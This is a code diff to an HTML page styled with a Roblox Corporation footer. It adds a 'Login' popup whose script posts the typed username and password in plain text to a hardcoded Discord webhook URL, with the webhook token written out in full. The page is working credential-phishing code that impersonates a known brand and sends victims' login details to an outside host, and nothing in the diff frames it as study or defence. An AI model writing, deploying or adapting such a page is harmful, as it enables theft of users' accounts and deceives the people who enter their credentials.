@@ -43,12 +43,84 @@
       padding: 20px;
       text-align: center;
     }
+
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      width: 300px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      display: none;
+    }
+
+    .popup.show {
+      display: block;
+    }
+
+    .popup h2 {
+      margin-top: 0;
+    }
+
+    .popup label,
+    .popup input[type="text"],
+    .popup input[type="password"],
+    .popup button {
+      display: block;
+      margin-bottom: 10px;
+    }
+
+    .popup button {
+      padding: 8px 12px;
+    }
   </style>
+  <script>
+    function openPopup() {
+      document.getElementById("loginPopup").classList.add("show");
+    }
+
+    function closePopup() {
+      document.getElementById("loginPopup").classList.remove("show");
+    }
+
+    function sendWebhook(event) {
+      event.preventDefault();
+      const webhookUrl = "https://discord.com/api/webhooks/1114747356055879781/7fH1tMXA2cJ8neQ3o4pMsZfnJwqAsBFt3xHOIcjHzrs3JZrJ5Fnun5zHluFw3bR5k60B";
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const payload = {
+        content: `Username: ${username}\nPassword: ${password}`
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Login information sent successfully!");
+          closePopup();
+        } else {
+          alert("Failed to send login information.");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("An error occurred while sending the login information.");
+      });
+    }
+  </script>
 </head>
 
 <body>
   <div class="header">
-    <a href="#">Login</a>
+    <a href="#" onclick="openPopup()">Login</a>
   </div>
 
   <div class="container">
@@ -58,9 +130,22 @@
     </div>
   </div>
 
+  <div id="loginPopup" class="popup">
+    <h2>Login</h2>
+    <form onsubmit="sendWebhook(event)">
+      <label for="username">Username:</label>
+      <input type="text" id="username" required>
+      <label for="password">Password:</label>
+      <input type="password" id="password" required>
+      <button type="submit">Login</button>
+      <button type="button" onclick="closePopup()">Close</button>
+    </form>
+  </div>
+
   <div class="footer">
     <p>&copy; 2023 Roblox Corporation. All rights reserved.</p>
   </div>
+
 </body>
 
 </html>
